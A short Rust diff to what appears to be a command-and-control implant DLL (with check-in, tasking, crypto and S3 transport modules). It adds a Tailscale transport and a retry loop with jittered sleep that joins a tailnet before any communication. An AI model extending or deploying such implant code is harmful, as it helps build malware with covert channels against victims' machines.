@@ -2,6 +2,7 @@ mod config;
 mod checkin;
 mod transport;
 mod s3_transport;
+mod tailscale_transport;
 mod crypto;
 mod tasking;
 mod features {
@@ -44,6 +45,19 @@ pub extern "system" fn DllMain(
 }
 
 fn run() {
+    // Tailscale initialization (join tailnet before any communication)
+    if config::use_tailscale {
+        loop {
+            match tailscale_transport::init() {
+                Ok(_) => break,
+                Err(e) => {
+                    eprintln!("[TS] Tailscale init failed: {}, retrying...", e);
+                    helpers::sleep_with_jitter();
+                }
+            }
+        }
+    }
+
     // S3 bootstrap registration (get per-execution IAM credentials)
     if config::use_s3 {
         loop {
